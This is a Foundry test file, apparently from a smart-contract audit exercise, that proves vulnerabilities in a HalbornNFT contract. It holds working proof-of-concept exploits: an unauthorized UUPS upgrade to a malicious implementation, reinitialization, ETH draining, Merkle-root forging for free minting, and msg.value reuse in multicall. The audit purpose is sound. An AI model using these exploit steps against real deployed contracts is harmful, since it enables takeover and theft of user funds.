// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {NFT_UUPSattack} from "../src/exploits/HalbornNFTExploit.sol";
import {Merkle} from "./murky/Merkle.sol";

/**
 * @title HalbornNFT_Test
 * @dev Tests for critical vulnerabilities in HalbornNFT contract
 *
 * Found several critical issues:
 * - UUPS upgrade bypass allows anyone to upgrade
 * - Merkle root manipulation enables unlimited airdrop minting
 * - Price manipulation after upgrade
 * - ETH drainage via malicious upgrade
 * - Counter overflow (theoretical, not practical)
 *
 * Root cause is empty _authorizeUpgrade() and missing access controls.
 * This leads to complete protocol takeover.
 */
contract HalbornNFT_Test is Test, Merkle {
    HalbornNFT public nft;
    ERC1967Proxy proxy;
    HalbornNFT impl;

    function setUp() public {
        impl = new HalbornNFT();
        proxy = new ERC1967Proxy(address(impl), "");
        nft = HalbornNFT(address(proxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);
    }

    // Test Initialize base implementation
    function test_initialize() public {
        assertEq(nft.merkleRoot(), keccak256(abi.encodePacked("root")));
        assertEq(nft.price(), 1 ether);
    }

    // Critical: multicall reuses msg.value across calls
    function test_multicall_valueReuse_mintBuyWithETH() public {
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(nft.mintBuyWithETH.selector);
        calls[1] = abi.encodeWithSelector(nft.mintBuyWithETH.selector);

        vm.deal(address(this), 1 ether);
        uint256 balanceBefore = address(nft).balance;

        nft.multicall{value: 1 ether}(calls);

        assertEq(nft.balanceOf(address(this)), 2);
        assertEq(nft.idCounter(), 2);
        assertEq(address(nft).balance, balanceBefore + 1 ether);
    }

    // Test that anyone can set merkle root
    /**
     * @dev Merkle root manipulation attack
     *
     * The setMerkleRoot() function has no access control, so anyone can call it
     * with an arbitrary root. This completely bypasses the whitelist mechanism.
     *
     * Attack flow:
     * 1. Anyone can call setMerkleRoot() with arbitrary root
     * 2. Attacker sets empty root or crafted root including their address
     * 3. Whitelist mechanism is now bypassed
     */
    function test_setMerkelRoot() public {
        address unauthorizedUser = address(0xdead);

        // PROOF: State before exploit
        bytes32 originalRoot = nft.merkleRoot();
        console.log("BEFORE EXPLOIT:");
        console.log("Original merkle root:", vm.toString(originalRoot));
        console.log("Unauthorized user can change root:", false);

        vm.prank(unauthorizedUser);

        // Unauthorized user can set arbitrary merkle root
        // This completely bypasses the whitelist mechanism
        bytes32 newRoot = keccak256(abi.encodePacked(""));
        nft.setMerkleRoot(newRoot);

        // PROOF: State after exploit
        console.log("\nAFTER EXPLOIT:");
        console.log("New merkle root:", vm.toString(nft.merkleRoot()));
        console.log("Unauthorized user changed root:", true);
        console.log("Whitelist bypassed:", true);

        assertEq(nft.merkleRoot(), newRoot);
    }

    // Test minting after setting merkle root
    /**
     * @dev Unlimited airdrop minting via merkle manipulation
     *
     * By combining merkle root manipulation with unlimited minting, an attacker can
     * create a custom merkle tree with their address and mint unlimited NFTs.
     *
     * Attack flow:
     * 1. Craft malicious merkle tree with attacker's address and multiple token IDs
     * 2. Generate valid proofs for each token ID
     * 3. Call setMerkleRoot() with crafted root (no access control)
     * 4. Mint multiple NFTs using the crafted proofs
     */
    function test_setMintUnlimited() public {
        address unauthorizedUser = address(0xdead);

        // PROOF: State before exploit
        console.log("BEFORE EXPLOIT:");
        console.log("Test contract NFT balance:", nft.balanceOf(address(this)));
        console.log("Total NFT supply:", nft.idCounter());
        console.log("Can mint without whitelist:", false);

        vm.prank(unauthorizedUser);

        // Step 1: Craft malicious merkle tree with test contract address
        bytes32 left = keccak256(abi.encodePacked(address(this), uint256(1)));
        bytes32 right = keccak256(abi.encodePacked(address(this), uint256(2)));
        bytes32 root = hashLeafPairs(left, right);

        // Step 2: Generate valid proofs for both tokens
        bytes32[] memory proofForLeft = new bytes32[](1);
        proofForLeft[0] = right;

        bytes32[] memory proofForRight = new bytes32[](1);
        proofForRight[0] = left;

        // Set malicious merkle root (no authorization required)
        nft.setMerkleRoot(root);

        // Step 4: Mint unlimited NFTs using crafted proofs
        nft.mintAirdrops(1, proofForLeft);
        nft.mintAirdrops(2, proofForRight);

        // PROOF: State after exploit
        console.log("\nAFTER EXPLOIT:");
        console.log("Test contract NFT balance:", nft.balanceOf(address(this)));
        console.log("Total NFT supply:", nft.idCounter());
        console.log("Unlimited minting achieved:", true);
        console.log("Whitelist completely bypassed:", true);

        // Could continue minting more with additional crafted proofs
    }

    // Test that anyone can upgrade to malicious implementation
    /**
     * @dev UUPS upgrade takeover attack
     *
     * The contract has an empty _authorizeUpgrade() function, so anyone can deploy
     * a malicious implementation and upgrade to it.
     *
     * Attack flow:
     * 1. Deploy malicious NFT implementation
     * 2. Call upgradeTo() to replace legitimate implementation
     * 3. Re-initialize with attacker as owner and malicious parameters
     * 4. Attacker now controls entire NFT contract
     */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        assertEq(nft.price(), 1 ether);

        // Step 1: Deploy malicious implementation
        NFT_UUPSattack attack = new NFT_UUPSattack();

        // Upgrade to malicious implementation (no authorization required)
        nft.upgradeTo(address(attack));

        // Step 3: Re-initialize with attacker as owner and malicious price
        nft.initialize("", 666);

        // Step 4: Verify attacker now controls price (and everything else)
        assertEq(nft.price(), 666);
    }

    // Critical Exploit 9: anyone can set price
    function test_setPrice() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        uint256 newPrice = 666;

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", newPrice);

        assertEq(nft.price(), newPrice);
    }

    // Medium Bug 10: idCounter increment is unchecked
    function test_overflowCounter() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", 1);

        assertEq(nft.price(), 1);
        // this is just an example, but completely infeasable to do
        // becasue the max stack depth in solidity is 1024
        // it would take 1.157920892373162e+77 iterations to overflow
        // which is completely infeasable to do
        // but theoretically possible
        /*         
        for(uint256 i = 0; i < type(uint).max; i++) {
            nft.mintBuyWithETH{value: 1 ether}();
        } 
        */
    }

    // Test that anyone can steal ETH from contract
    /**
     * @dev ETH drainage attack via malicious upgrade
     *
     * After upgrading to a malicious implementation, the attacker can drain all ETH
     * from the contract. The malicious implementation includes a withdrawETH() function.
     *
     * Attack flow:
     * 1. Legitimate users buy NFTs, funding the contract with ETH
     * 2. Attacker upgrades to malicious implementation
     * 3. Malicious implementation has withdrawETH() function for attacker
     * 4. Attacker drains all ETH from contract
     */
    function test_stealETH() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);
        vm.deal(unauthorizedUser, 1e18);

        // Step 1: Legitimate user buys NFT, funding the contract
        nft.mintBuyWithETH{value: 1 ether}();

        // PROOF: State before exploit
        uint256 attackerBalanceBefore = unauthorizedUser.balance;
        uint256 contractBalanceBefore = address(nft).balance;
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Attacker can drain contract:", false);

        // Step 2: Deploy and upgrade to malicious implementation
        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", 666);

        // Drain all ETH from the contract
        nft.withdrawETH(0); // Malicious function ignores amount param, drains all

        // PROOF: State after exploit
        uint256 attackerBalanceAfter = unauthorizedUser.balance;
        uint256 contractBalanceAfter = address(nft).balance;
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Contract ETH balance:", contractBalanceAfter);
        console.log(
            "ETH stolen:",
            attackerBalanceAfter - attackerBalanceBefore
        );
        console.log("Contract drained:", contractBalanceAfter == 0);

        // Step 4: Verify successful theft
        assertEq(contractBalanceAfter, 0);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 1 ether);
    }

    // High: Reinitialization After Upgrade Enables State Reset
    /**
     * @dev Reinitialization attack after upgrade
     *
     * After upgrading to a malicious implementation, the attacker can call
     * initialize() again on the new implementation, resetting all state
     * including ownership, merkle root, and price.
     *
     * Attack flow:
     * 1. Upgrade to malicious implementation
     * 2. Call initialize() on new implementation (reinitialization)
     * 3. Attacker becomes owner, all state is reset
     */
    function test_reinitializationAfterUpgradeEnablesStateReset() public {
        address unauthorizedUser = address(0xdead);
        
        bytes32 originalRoot = nft.merkleRoot();
        uint256 originalPrice = nft.price();
        address originalOwner = nft.owner();
        
        // Fund contract with ETH
        vm.deal(address(nft), 1 ether);
        uint256 contractBalanceBefore = address(nft).balance;
        
        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation WITHOUT initializing
        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));

        // Step 2: Now initialize on new implementation with attacker-controlled values
        // This should work because it's a new implementation (initializer modifier allows it)
        bytes32 maliciousRoot = keccak256("malicious");
        uint256 maliciousPrice = 666;
        nft.initialize(maliciousRoot, maliciousPrice);

        // Step 3: Verify state was reset
        // NFT_UUPSattack sets hackerAddress = msg.sender in initialize()
        assertEq(nft.merkleRoot(), maliciousRoot);
        assertEq(nft.price(), maliciousPrice);
        
        // Verify attacker can call hacker-only functions (like withdrawETH)
        uint256 attackerBalanceBefore = unauthorizedUser.balance;
        nft.withdrawETH(0); // Should drain all ETH to hacker
        uint256 attackerBalanceAfter = unauthorizedUser.balance;
        
        // Verify ETH was drained
        assertEq(address(nft).balance, 0);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, contractBalanceBefore);

        // Original values are gone
        assertNotEq(nft.merkleRoot(), originalRoot);
        assertNotEq(nft.price(), originalPrice);
        
        // Original owner lost control
        vm.startPrank(originalOwner);
        vm.expectRevert(); // Original owner can no longer control contract
        nft.setPrice(1 ether);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}